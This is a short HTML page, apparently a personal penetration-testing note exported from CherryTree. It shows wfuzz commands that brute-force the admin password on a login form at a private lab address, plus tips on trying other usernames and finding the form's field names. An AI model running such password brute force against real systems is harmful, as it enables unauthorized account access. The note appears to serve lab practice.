@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>wfuzz</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>wfuzz</h1><br/><br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d &quot;username=admin&amp;password=FUZZ&quot;  --hh 206 <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a><br /><br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d &quot;username=admin&amp;password=FUZZ&quot; <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a> | grep -v 206<br /><br />^^FUZZ is the magic word. replace admin with root and other potential usernames.^^<br />view page source and see if it is looking user, uname, username etc... same with pword.</div></body></html>
